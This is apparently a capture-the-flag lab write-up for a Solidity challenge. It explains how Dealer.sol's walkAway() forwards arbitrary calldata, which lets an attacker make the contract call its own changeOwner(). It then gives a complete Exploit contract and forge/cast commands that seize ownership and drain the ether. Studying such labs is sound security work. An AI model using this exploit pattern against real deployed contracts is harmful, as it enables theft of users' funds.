Here we have 2 source code, one is *Setup.sol* and another one is *Dealer.sol*, In order to make *Setup.sol::isSolved()* return true, we must make the balance of *Dealer Contract* become 0 and the *owner* is no longer *Setup Contract*.
&nbsp;  
&nbsp;  
```solidity
contract Setup{
    Dealer public dealer;

    constructor() payable{
        dealer = new Dealer();
        dealer.joinGame{value: 50 ether}();
    }

    function isSolved() public view returns(bool){
        return address(dealer).balance == 0 && dealer.owner() != address(this);
    }

}
```
&nbsp;  
Based on the initial setup, we know that the current owner is *Setup Contract* and it has 50 Ether. Let's take a tour of the *Dealer Contract* now,
&nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract Dealer{
    bool public readyToRig;
    address public owner;
    uint256 public rewardPool;
    mapping(address => uint256) public balanceOf;

    constructor() payable{
        owner = msg.sender;
    }

    function joinGame() public payable{
        require(msg.value >= 5 ether, "Must Deposit Minimum of 5 Ether!");
        balanceOf[msg.sender] += msg.value;
    }

    function bet(uint256 _amount) public{
        require(balanceOf[msg.sender] >= 5 ether, "Need 5 Ether to bet");
        require(_amount >= 2 ether, "Start with 2");
        rewardPool += balanceOf[owner];
        balanceOf[owner] = 0;
        rewardPool += _amount;
        balanceOf[msg.sender] -= _amount;
        readyToRig = true;
    }

    function startRiggedBet() public onlyOwner{
        require(readyToRig == true, "Pool is not filled!");
        balanceOf[owner] += rewardPool;
        rewardPool = 0;
        readyToRig = false;
    }

    function endWholeGame() public onlyOwner{
        uint256 toSend = balanceOf[owner];
        (bool sent, ) = owner.call{value: toSend}("");
        require(sent, "Ending Game Failed!");
    }

    function walkAway(address _to, bytes memory message) public {
        require(readyToRig == true, "You want to wal away empty handed?");
        uint256 leftAmount = balanceOf[msg.sender];
        balanceOf[msg.sender] -= leftAmount;
        (bool sent, ) = _to.call{value: leftAmount}(message);
        require(sent, "You can't run it seems.");
    }

    function changeOwner(address _newOwner) public payable{
        require(msg.sender == address(this), "Only Dealer can change owner");
        owner = _newOwner;
        balanceOf[owner] += msg.value;
    }

    modifier onlyOwner(){
        require(msg.sender == owner, "Only Owner can start bet!");
        _;
    }

    receive() external payable {
        if(msg.value == 5 ether){
            balanceOf[msg.sender] += msg.value;
        }else{
            rewardPool += msg.value;
        }
    }
}
```
&nbsp;  
We can see that it can receive ether with 2 functions, the *joinGame()* and *receive()*. The only difference is that when we use joinGame, it requires us to send at least 5 Ether, while the receive function has a logic: if the amount is exactly 5 Ether only, then it will be added to our balance; otherwise,  it will be added to the rewardPool. &nbsp;  
&nbsp;  
The *bet()* function allows us to put our money on the line, and while we have the freedom to choose how much money we want to spend, the *owner* seems to go all-in, kind of weird, right? Turns out, the next function *startRiggedBet()* will actually make the owner always win since it transferred all the rewardPool to the owner, and after that the owner could call *endWholeGame()* and just get all the money there. &nbsp;  
&nbsp;  
We as a player also have an option, but that is only available after we *bet()* some of our money. We can just *walkAway* with the money we have left and leave a message... Oh well, we can leave a message that is being handled by *call()*, and with that we can actually call *changeOwner()* and make ourselves the *owner*. This could happen because if we parse a bytes, that's actually a function call. What's a function call? In Ethereum, they call a function by giving a 4 bytes, or what they often call a function selector or signature, it's the first 4 bytes of *keccak256(functionName(args_type))*. &nbsp;  
&nbsp;  
So here is what we are going to do:  &nbsp;  
&nbsp;  
1. We *joinGame()* with 5 Ether
2. We *bet()* 3 Ether
3. We *walkAway()*, the current rewardPool is 53 Ether, but we transfer the money to *dealer* by providing his address, effectively giving it 2 Ether (our leftAmount) and parse a message containing the call of *changeOwner(address)* with the address pointing to our Exploit Contract.
4. The current owner will be our exploit contract; we can just *startRiggedBet()*, taking all the rewardPool
5. Transfer all money to our pocket by calling *endWholeGame()*.

&nbsp;  
The message that we are going to provide will consist of the name of the *changeOwner()* selector and the address of our Exploit contract; it is constructed like this &nbsp;  
&nbsp;  
```test
// Default Construction
[4 bytes - selector] [32 bytes - Data/Args ] [can add more 32 bytes (SLOT) if needed]

// changeOwner(address) - newOwner address
0xa6f9dae1 000000000000000000000000 00648ca25a2e54b636c22cd5e1df72da69570aa2
|selector| |   padding 12 bytes   | |     newOwner Address - 20 bytes      |
|4 bytes | |-------------------------32 bytes / 1 SLOT---------------------|
```
&nbsp;  
How do we get *0xa6f9dae1*? Well, we can use the built-in function *abi.encodeWithSignature(funcName(args-type), args-value)*, in our contract to parse this. Okay now that we understand what we need to do and how to do it, here is the full exploit to finally solve the lab. &nbsp;  
&nbsp;  
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "./Setup.sol";
import "./Dealer.sol";

contract Exploit{
    Dealer public dealer;
    Setup public setup;

    constructor(address _setup) payable{
        setup = Setup(_setup);
        dealer = Dealer(setup.dealer());
    } 

    function exploit() public{
        dealer.joinGame{value: 5 ether}();
        dealer.bet(3 ether);
        dealer.walkAway(address(dealer), abi.encodeWithSignature("changeOwner(address)",address(this)));
        dealer.startRiggedBet();
        dealer.endWholeGame();
    }

    receive() external payable { }

}
```
&nbsp;  
We just need to deploy the solver and give it 5 Ether to execute the *joinGame*, here is how you can do it. &nbsp;  
&nbsp;  
```bash
// deploy the contract
forge create src/silent-dealer/$EXPLOIT_SOL:$EXPLOIT_NAME -r $RPC --private-key $PK --constructor-args $SETUP_ADDR --value 5ether

// Launch the Exploit
cast send -r $RPC --private-key $PK $EXPLOIT_ADDR "exploit()"
```
&nbsp;  
Now you should've solved the lab!